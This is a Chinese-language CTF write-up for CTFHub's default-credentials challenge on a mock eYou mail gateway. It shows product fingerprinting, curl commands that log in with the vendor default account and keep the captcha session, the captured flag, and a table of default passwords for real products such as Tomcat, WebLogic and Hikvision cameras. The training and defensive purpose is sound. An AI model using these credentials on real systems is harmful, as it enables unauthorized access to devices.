---
layout: post
title: CTFHub - 默认口令 Writeup（亿邮邮件网关）
platform: ctfhub
date: 2026-10-18 22:45:00 +0800
categories: CTF
---

CTFHub - 默认口令 Writeup（亿邮邮件网关）

一、题目信息

- 平台：CTFHub（技能树 → Web → **密码口令** → 默认口令）
- 题型：Web
- 考点：**产品指纹识别**、**设备默认口令**、验证码会话机制


```text
页面标题：CTFHub——亿邮邮件网关
登录表单：
    <form action="login.php?mod=login" method="post">
      <input name="user_id">        用户名
      <input name="user_pass">      密码
      <input name="captcha">        验证码
      <input name="captcha_ctime">  验证码时间（隐藏）
      <img src="code.php">          验证码图片
    </form>

★ 阶段 1：取验证码（★ code.php 才下发 PHPSESSID）
    GET /              → 200，3299 字节，无 Set-Cookie
    GET /code.php      → 200，image/png 1538 字节
                          Set-Cookie: PHPSESSID=...(32位)
    ↑ 验证码和 Session 绑定，必须用同一个 PHPSESSID 提交

★ 阶段 2：用默认口令登录
    用户名: eyougw
    密码  : admin@(eyou)
    验证码: GC7（从图片里识别出来的）

    POST /login.php?mod=login
    user_id=eyougw&user_pass=admin@(eyou)&captcha=GC7&captcha_ctime=

    响应（59 字节）：
        Hello CTFHub eyougw admin, ctfhub{285e181b81c991cec94b0a6e}

flag：ctfhub{285e181b81c991cec94b0a6e}
```

> 💡 **验证码识别细节**：这个验证码是 100×30 的 PNG，带彩色噪点，
> 每个字符颜色随机。放大 13 倍后肉眼可读 —— 本次读到的是 `GC7`。
> 识别错了不要紧，重新抓一张再试即可。

二、题目分析

**① 什么是默认口令**

```text
默认口令（Default Credentials）= 设备/软件出厂自带的初始账号密码
    · 路由器：admin / admin
    · 摄像头：admin / 12345
    · Tomcat：admin / admin
    · WebLogic：weblogic / weblogic
    · MySQL：root / 空密码
    · Redis：无密码

★ 危害：安装后不修改默认密码 = 等于没有密码
  攻击者只要知道设备型号，查一下默认密码就能直接登录
```

**② 先做产品指纹识别（关键第一步）**

```text
打开环境 → 看页面标题：

    <title>CTFHub——亿邮邮件网关</title>
                        └───┬───┘
                     ★ 产品名：亿邮邮件网关（eYou）

★ 拿到产品名，就能去查它的默认账号密码 —— 这是本题的核心思路。
```

**③ 为什么不能爆破**

```text
看登录表单，有【验证码】：

    <input name="captcha">
    <img src="code.php" onclick="this.src='code.php?'+Math.random()">

★ 验证码的存在就是为了阻断自动化爆破：
    · 每次请求的验证码都不同
    · 猜错就失效，必须重新取
    · 自动化脚本无法识别图片里的字符

所以这题的思路不是"爆破"，而是"查默认口令"。
```

**④ 验证码的会话机制（实现细节，容易踩坑）**

```text
★ 关键：PHPSESSID 是 code.php 下发的，不是首页下发的

    GET /          → 200，无 Set-Cookie
    GET /code.php  → 200，Set-Cookie: PHPSESSID=xxx

  验证码内容存在服务端 Session 里，key = PHPSESSID。
  提交登录时带着这个 PHPSESSID，服务端才能取出对应验证码比对。

  ⚠️ 如果取验证码和提交登录用了不同的 Session → 必然 captcha error
```

三、解题步骤

**方法一：浏览器手工做（最直白）**

```text
① 浏览器打开题目地址 → 看到亿邮邮件网关登录页
② 页面上有验证码图片，看清里面的字符（比如 GC7）
③ 用户名填：eyougw
④ 密码填：admin@(eyou)
⑤ 验证码填：GC7
⑥ 点登录
⑦ 页面显示：Hello CTFHub eyougw admin, ctfhub{...}
```

**⚠️ 注意**：验证码在同一个页面里会自动随 Session 保持 ——
所以浏览器手工操作**天然满足**"同一 Session"的要求，最简单。

**方法二：curl / 脚本（要自己处理 Session）**

**第 1 步：先访问首页，再取验证码（保存 Cookie）**

```bash
BASE="http://challenge-xxx:10800"

# 访问首页
curl.exe -c cookie.txt -b cookie.txt -o index.html "$BASE/"

# ★ 取验证码（这一步才下发 PHPSESSID）
curl.exe -c cookie.txt -b cookie.txt -o captcha.png "$BASE/code.php"
```

**第 2 步：打开 captcha.png 认字符**

```text
图片是 100×30 的小图，带彩色噪点
→ 放大后能看清 3~4 个字符（本次是 GC7）
```

**第 3 步：带同一个 Cookie 提交登录**

```bash
curl.exe -i -c cookie.txt -b cookie.txt \
  --data-urlencode "user_id=eyougw" \
  --data-urlencode "user_pass=admin@(eyou)" \
  --data-urlencode "captcha=GC7" \
  --data-urlencode "captcha_ctime=" \
  "$BASE/login.php?mod=login"
```

**响应**：

```text
Hello CTFHub eyougw admin, ctfhub{285e181b81c991cec94b0a6e}
```

**方法三：用我写的工具（自动处理 Session）**

```text
双击 eyou-login.bat
→ 粘贴地址
→ 脚本自动抓验证码、弹出图片
→ 你输入看到的字符
→ 自动登录并打印 flag
```

**脚本做的三件事**：

```text
① 清空旧 Cookie → GET / → GET /code.php（拿新 PHPSESSID + 验证码图片）
② 保存 Cookie 到 eyou_cookies.txt，图片存 eyou_captcha.png
③ 带同一个 PHPSESSID 提交 POST /login.php?mod=login
```

**实测输出**：

```text
① 访问首页
   状态码 200，长度 3299
② 取验证码图片
   状态码 200，大小 1538 字节
   已保存 Cookie: PHPSESSID=61fa65fb469629289b665b23cc34b519
   已保存验证码: eyou_captcha.png

③ 提交默认账号密码 + 验证码
   用户名: eyougw
   密码  : admin@(eyou)
   验证码: GC7
   状态码 200，响应长度 59
   页面内容: Hello CTFHub eyougw admin, ctfhub{285e181b81c991cec94b0a6e}

★ FLAG: ctfhub{285e181b81c991cec94b0a6e}
```

四、延伸知识

**① 亿邮（eYou）邮件网关**

```text
亿邮（eYou）是国内老牌的邮件系统/邮件网关厂商，
很多高校、政府、企业的邮件系统用它。

★ 本题用的默认账号：
    用户名: eyougw
    密码  : admin@(eyou)

  "eyougw" 可以理解为 "eyou gateway"（亿邮网关）的缩写，
  是厂商留的测试账号 —— 部署后应当立即删除或改密。
```

**② 常见的设备默认口令表（记忆积累）**

| 产品 | 默认账号 / 密码 |
|---|---|
| 亿邮邮件网关 | `eyougw` / `admin@(eyou)` |
| Tomcat 管理台 | `admin` / `admin`、`tomcat` / `tomcat` |
| WebLogic | `weblogic` / `weblogic` |
| JBoss | `admin` / `admin` |
| Jenkins | 无默认（首次可任意设置）|
| 路由器（TP-Link）| `admin` / `admin` |
| 海康摄像头 | `admin` / `12345` |
| MySQL | `root` / 空 |
| Redis | 无密码（`redis-cli` 直接进）|
| Zabbix | `Admin` / `zabbix` |
| phpMyAdmin | `root` / 空 |

**怎么查**：搜索引擎搜「产品名 + 默认密码 / default password」，
或者查厂商的安装手册、CVE 库。

**③ 验证码相关的攻击面**

```text
· 验证码可复用（不销毁）→ 可以固定一个验证码反复爆破
· 验证码在前端校验（JS 判断）→ 可以绕过，直接提交
· 验证码图片可预测（时间戳命名 / 弱随机）→ 可以枚举
· 验证码接口无频率限制 → 可以 OCR 批量识别
· ★ 本题的验证码是正常的（服务端 Session 校验），所以只能"查默认口令"
```

**④ 防护**

```text
· 部署后立即修改/删除所有默认账号（这是最基本的一条）
· 建立"默认凭据扫描"作为上线检查项
· 管理后台限制来源 IP（只允许内网/办公网访问）
· 加登录失败锁定 + 多因素认证
· 不要把管理后台暴露在公网
```

五、总结

- **本题核心：识别产品（亿邮邮件网关）→ 查它的默认口令 → 带着验证码登录。**
- 正确凭据：

```text
用户名: eyougw
密码  : admin@(eyou)
```

- 两个技术要点：

```text
① 有验证码 → 不能爆破 → 思路转向"查默认口令"
② PHPSESSID 由 code.php 下发 → 取验证码和提交登录必须同一个 Session
```

> （CTF 靶场、自己的设备、有书面授权的渗透测试）。
> 未经授权登录他人系统属于违法行为。
